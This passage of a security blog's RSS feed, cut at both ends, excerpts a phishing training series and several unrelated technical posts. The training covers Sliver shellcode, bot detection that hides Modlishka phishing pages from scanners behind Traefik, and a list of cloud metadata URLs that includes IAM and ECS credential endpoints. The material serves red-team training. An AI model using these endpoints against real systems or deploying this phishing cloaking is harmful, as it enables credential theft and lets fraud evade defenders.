&lt;h3 id="generate-shellcode"&gt;Generate shellcode&lt;a class="td-heading-self-link" href="#generate-shellcode" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In a sliver shell we need to run the following to generate some shellcode to be used later. We&amp;rsquo;ll use &lt;code&gt;test.example&lt;/code&gt; as the callback domain, we will add an entry to the Windows hosts file.&lt;/p&gt;</description></item><item><title>Bot Detection</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/120-bot-detection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/120-bot-detection/</guid><description>&lt;h3 id="what-are-bots"&gt;What are bots?&lt;a class="td-heading-self-link" href="#what-are-bots" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Bots are usually headless browsers that visit links in email and analyze them for threats. This includes looking for
logins, especially popular ones that are not on the correct domain. We need a reliable way to determine if a request is
coming from a real user or a bot.&lt;/p&gt;

&lt;h3 id="how-can-we-detect-bots"&gt;How can we detect bots?&lt;a class="td-heading-self-link" href="#how-can-we-detect-bots" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;To do this we can use javascript to inspect the browser that is visiting our page. There are a number of decent articles
out there on how to do this. We&amp;rsquo;ll use at minimum to detect &lt;a href="https://urlscan.io"&gt;urlscan.io&lt;/a&gt;.&lt;/p&gt;</description></item><item><title>Traefik Reverse Proxy</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/125-traefik-reverse-proxy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/125-traefik-reverse-proxy/</guid><description>&lt;h3 id="traefik-reverse-proxy"&gt;Traefik Reverse Proxy&lt;a class="td-heading-self-link" href="#traefik-reverse-proxy" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now that we have a reliable way to detect bots, we need to be able to make that determination before showing the phishing page. Then we can show bots simple non-malicious content and users will get our phishing pages. We can do this using traefik to route requests based on cookies. We can put traefik in front of Modlishka and force all request to go through a simple bot check before loading our phishing site.&lt;/p&gt;</description></item><item><title>Wrap up</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/200-wrap-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/200-wrap-up/</guid><description>&lt;blockquote&gt;
&lt;p&gt;THIS IS A ROUGH OUTLINE OF WHAT NEEDS TO BE FINISHED&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id="what-needs-to-change-for-live-assessments"&gt;What needs to change for live assessments&lt;a class="td-heading-self-link" href="#what-needs-to-change-for-live-assessments" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now we have a decent understanding of our current capabilities. How can we successfully execute this for reals?&lt;/p&gt;
&lt;p&gt;We need the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A domain to send emails from.&lt;/li&gt;
&lt;li&gt;A domain to host malicious content. Could be the same, but it&amp;rsquo;s nice have them separate in case one is burned.&lt;/li&gt;
&lt;li&gt;TLS Certs.&lt;/li&gt;
&lt;li&gt;A target and their permission.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id="domains"&gt;Domains&lt;a class="td-heading-self-link" href="#domains" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We like to use Amazon&amp;rsquo;s Route53 for a number of reasons:&lt;/p&gt;</description></item><item><title>Publish Flutter App to Google Play Using GitHub Actions</title><link>https://defektive.github.io/blog/2025/10/31/publish-flutter-app-to-google-play-using-github-actions/</link><pubDate>Fri, 31 Oct 2025 00:00:00 +0000</pubDate><guid>https://defektive.github.io/blog/2025/10/31/publish-flutter-app-to-google-play-using-github-actions/</guid><description>&lt;p&gt;I have been wanting to do more mobile app development and streamline the release process for a while now. I read a few things on how to publish to the Play Store with GitHub actions, but I kept running into issues. I&amp;rsquo;ll try to document what the issues were and how I was able to get past them.&lt;/p&gt;
&lt;p&gt;I am using &lt;a href="https://github.com/r0adkll/upload-google-play"&gt;https://github.com/r0adkll/upload-google-play&lt;/a&gt; to publish actions. To make testing easier, I used &lt;a href="https://github.com/nektos/act"&gt;https://github.com/nektos/act&lt;/a&gt; to run my GitHub actions locally. I used the largest docker image, since the other ones didn&amp;rsquo;t seem to have what I needed for Android builds.&lt;/p&gt;</description></item><item><title>Adventures in Python</title><link>https://defektive.github.io/blog/2025/01/09/adventures-in-python/</link><pubDate>Thu, 09 Jan 2025 00:00:00 +0000</pubDate><guid>https://defektive.github.io/blog/2025/01/09/adventures-in-python/</guid><description>&lt;p&gt;I try to like python. I really do. I attempt to use it and be like all the other cool people. Sadly, I am a dumb python noob. I see an import like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;Crypto.Cipher&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Cool, lets install the &lt;code&gt;crypto&lt;/code&gt; pacakge&amp;hellip;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;pip install crypto
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It returns &lt;code&gt;command not found: pip&lt;/code&gt;, fair enough. I am not a python dev, my environment isn&amp;rsquo;t setup. Lets run the module.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 -m pip install crypto
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;More errors:&lt;/p&gt;</description></item><item><title>PHP Code Review</title><link>https://defektive.github.io/docs/code-review/05-php/</link><pubDate>Thu, 05 Sep 2024 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/code-review/05-php/</guid><description/></item><item><title>Packer, Ubuntu Noble, and VirtualBox</title><link>https://defektive.github.io/blog/2024/08/31/packer-ubuntu-noble-and-virtualbox/</link><pubDate>Sat, 31 Aug 2024 00:00:00 +0000</pubDate><guid>https://defektive.github.io/blog/2024/08/31/packer-ubuntu-noble-and-virtualbox/</guid><description>&lt;p&gt;I have been using Packer for quite a while. However, all my interactions have
used JSON instead of HCL. I wanted to set up a new build using HCL, VirtualBox,
and Ubuntu 24.04. I am going to attempt to create documentation for using HCL
with VirtualBox to build a custom image based on the latest Ubuntu LTS release
(with cloud init).&lt;/p&gt;
&lt;p&gt;In my research I found some decent guides that did most of what I wanted. I&amp;rsquo;ll
use these a reference for building my specific use case.&lt;/p&gt;</description></item><item><title>Adopting Docsy Theme</title><link>https://defektive.github.io/blog/2024/08/27/adopting-docsy-theme/</link><pubDate>Tue, 27 Aug 2024 00:00:00 +0000</pubDate><guid>https://defektive.github.io/blog/2024/08/27/adopting-docsy-theme/</guid><description>&lt;p&gt;I recently (not that recent) discovered the &lt;a href="https://www.docsy.dev/"&gt;Docsy&lt;/a&gt; theme for &lt;a href="https://gohugo.io/"&gt;Hugo&lt;/a&gt;. After playing with it on a few mini projects, I have decided to migrate this site to use it. I imagine I will slowly start migrating other things to it as well.&lt;/p&gt;</description></item><item><title>SaintCON Training</title><link>https://defektive.github.io/blog/2023/09/30/saintcon-training/</link><pubDate>Sat, 30 Sep 2023 09:05:01 +0000</pubDate><guid>https://defektive.github.io/blog/2023/09/30/saintcon-training/</guid><description>&lt;p&gt;I&amp;rsquo;ve been working on a phishing training for SAINTCON. I used this to brainstorm how I wanted the network laid out.&lt;/p&gt;

&lt;h2 id="network-diagram"&gt;Network Diagram&lt;a class="td-heading-self-link" href="#network-diagram" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;pre class="mermaid"&gt;flowchart TB
wifi--&amp;gt;opnet

subgraph labnet [FakeNet]
 direction TB

 subgraph corpnet [Corp Network]
 subgraph corpnetprod [Production Network]


 smtp[Corporate Web Site]
 www[Corporate Web Site]
 webapp[product]
 end

 subgraph corpnetinternal [Internal Network]

 corpuser[Corp User]
 codehosting[Code Server]

 end

 end


 subgraph wifi [Guest Network]
 operator001(&amp;#34;Operator Physical Machines&amp;#34;)
 end



 subgraph opnet [Op Network]
 op001(&amp;#34;Operations VMs&amp;#34;)
 end


 opnet--&amp;gt;corpnetprod;
 corpnetinternal&amp;lt;--&amp;gt;corpnetprod;

end&lt;/pre&gt;

&lt;h2 id="work-flows"&gt;Work Flows&lt;a class="td-heading-self-link" href="#work-flows" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;pre class="mermaid"&gt;stateDiagram-v2
 [*] --&amp;gt; Onboard
 Onboard --&amp;gt; OSINT
 OSINT --&amp;gt; InfrastructureDev
 InfrastructureDev --&amp;gt; CampaignDevelopment
 CampaignDevelopment --&amp;gt; Test
 Test --&amp;gt; Phish

 state Onboard {
 [*] --&amp;gt; ConnectNet
 ConnectNet --&amp;gt; AccessVM
 AccessVM --&amp;gt; ReadDocs
 ReadDocs --&amp;gt; [*]
 }

 state OSINT {
 [*] --&amp;gt; SearchEngines
 [*] --&amp;gt; CrunchBase
 [*] --&amp;gt; LinkedIn
 [*] --&amp;gt; CodeHosting
 [*] --&amp;gt; DNSRecon
 [*] --&amp;gt; MailServers
 [*] --&amp;gt; LoginPages
 SearchEngines --&amp;gt; [*]
 CrunchBase --&amp;gt; [*]
 LinkedIn --&amp;gt; [*]
 CodeHosting --&amp;gt; [*]
 DNSRecon --&amp;gt; [*]
 MailServers --&amp;gt; [*]
 LoginPages --&amp;gt; [*]
 }

 state InfrastructureDev {
 SpinUpServices : Spin up Services
 PointDomains : Point Domains
 StaticSite : Static Site

 [*] --&amp;gt; SpinUpServices
 SpinUpServices --&amp;gt; PointDomains
 SpinUpServices --&amp;gt; Modlishka
 SpinUpServices --&amp;gt; Gophish
 SpinUpServices --&amp;gt; StaticSite
 Modlishka --&amp;gt; [*]
 Gophish --&amp;gt; [*]
 StaticSite --&amp;gt; [*]
 PointDomains --&amp;gt; [*]
 }

 state CampaignDevelopment {

 [*] --&amp;gt; EmailTemplates
 [*] --&amp;gt; PayloadCreation
 EmailTemplates --&amp;gt; TestCampaigns
 PayloadCreation --&amp;gt; TestCampaigns
 TestCampaigns --&amp;gt; [*]
 }

 state Test {
 [*] --&amp;gt; SendTestEmail
 SendTestEmail --&amp;gt; TestCredHarvesting
 TestCredHarvesting --&amp;gt; TestPayload
 TestPayload --&amp;gt; [*]
 }

 state Phish {
 [*] --&amp;gt; ScheduleCampaign
 ScheduleCampaign --&amp;gt; WaitForCreds
 ScheduleCampaign --&amp;gt; WaitForCallback
 WaitForCreds --&amp;gt; TakeOverSession
 TakeOverSession --&amp;gt; AuthenticatedPostExploitation
 WaitForCallback --&amp;gt; InternalPostExploitation
 InternalPostExploitation --&amp;gt; [*]
 AuthenticatedPostExploitation --&amp;gt; [*]
 }&lt;/pre&gt;</description></item><item><title>Curl Resolve DNS through Proxy</title><link>https://defektive.github.io/blog/2021/02/17/curl-resolve-dns-through-proxy/</link><pubDate>Wed, 17 Feb 2021 12:20:01 +0000</pubDate><guid>https://defektive.github.io/blog/2021/02/17/curl-resolve-dns-through-proxy/</guid><description>&lt;p&gt;If you append &lt;code&gt;h&lt;/code&gt; to your socks5 protocol prefix when using &lt;code&gt;--proxy&lt;/code&gt; the DNS resolution happens on the other side of the socks proxy!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;curl --proxy socks5h://127.0.0.1:1080 http://internal-host
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>Cloud metadata URLs</title><link>https://defektive.github.io/blog/2020/01/30/cloud-metadata-urls/</link><pubDate>Thu, 30 Jan 2020 16:20:01 +0000</pubDate><guid>https://defektive.github.io/blog/2020/01/30/cloud-metadata-urls/</guid><description>&lt;h3 id="alibaba"&gt;Alibaba&lt;a class="td-heading-self-link" href="#alibaba" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://100.100.100.200/latest/meta-data/
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://100.100.100.200/latest/meta-data/instance-id
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://100.100.100.200/latest/meta-data/image-id
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.alibabacloud.com/help/faq-detail/49122.htm"&gt;https://www.alibabacloud.com/help/faq-detail/49122.htm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;

&lt;h3 id="aws"&gt;AWS&lt;a class="td-heading-self-link" href="#aws" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/user-data
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/meta-data/iam/security-credentials/
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/meta-data/ami-id
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/meta-data/reservation-id
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/meta-data/hostname
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/meta-data/
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/latest/meta-data/public-keys/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id="ecs-task"&gt;ECS Task&lt;a class="td-heading-self-link" href="#ecs-task" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.170.2/v2/credentials/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories"&gt;http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html"&gt;https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;

&lt;h3 id="azure"&gt;Azure&lt;a class="td-heading-self-link" href="#azure" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;h4 id="no-header-required"&gt;No header Required&lt;a class="td-heading-self-link" href="#no-header-required" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/metadata/v1/maintenance
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id="requires-header"&gt;Requires header&lt;a class="td-heading-self-link" href="#requires-header" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Must use &lt;code&gt;Metadata: true&lt;/code&gt; request header&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/metadata/instance?api-version=2017-04-02
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;amp;format=text
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/"&gt;https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service"&gt;https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;

&lt;h3 id="google-cloud"&gt;Google Cloud&lt;a class="td-heading-self-link" href="#google-cloud" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;h4 id="requires-header-1"&gt;Requires header&lt;a class="td-heading-self-link" href="#requires-header-1" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Must use one of the following headers&lt;/strong&gt;&lt;/p&gt;</description></item><item><title>PfSense and SELKS</title><link>https://defektive.github.io/blog/2019/04/23/pfsense-and-selks/</link><pubDate>Tue, 23 Apr 2019 16:20:01 +0000</pubDate><guid>https://defektive.github.io/blog/2019/04/23/pfsense-and-selks/</guid><description>&lt;p&gt;I installed &lt;a href="https://www.stamus-networks.com/2017/08/22/selks-4-0/"&gt;SELKS&lt;/a&gt; this in a VM. I am using Fedora Server (which
I kind of regret because of the updates).&lt;/p&gt;
&lt;p&gt;Once installed I went to my PfSense firewall admin interface, to bridge LAN and WAN to a 3rd interface (
OPT1). &lt;a href="https://www.techdodo.co.uk/adding-span-port-pfsense"&gt;ref&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; WAN
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +--------------v----------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; | |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; | |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; | PfSense |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; | |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; | |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; | |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +---+--------------------+------+
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; | |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; | |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; | |
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; v v
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; LAN OPT1
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; (to SELKS Monitor port)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id="pfsense-logs-in-selks-kibana"&gt;PfSense logs in SELKS kibana&lt;a class="td-heading-self-link" href="#pfsense-logs-in-selks-kibana" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;I used some files from &lt;a href="https://github.com/patrickjennings/logstash-pfsense"&gt;here&lt;/a&gt;, then
enabled &lt;a href="https://docs.netgate.com/pfsense/en/latest/monitoring/copying-logs-to-a-remote-host-with-syslog.html"&gt;log forwarding in pfsense&lt;/a&gt;&lt;/p&gt;</description></item><item><title>Anyproxy Intercept</title><link>https://defektive.github.io/blog/2019/03/11/anyproxy-intercept/</link><pubDate>Mon, 11 Mar 2019 16:20:01 +0000</pubDate><guid>https://defektive.github.io/blog/2019/03/11/anyproxy-intercept/</guid><description>&lt;p&gt;Anyproxy is an intercept proxy. I used it to inject scripts into pages to assist in web fuzzing.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-js" data-lang="js"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;AnyProxy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./anyproxy/proxy&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;port&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;rule&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./dfkt_rule&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;webInterface&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;enable&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;webPort&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;8002&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;throttle&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;forceProxyHttps&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;wsIntercept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;silent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;proxyServer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;AnyProxy&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ProxyServer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;proxyServer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ready&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ready&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;proxyServer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;error&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
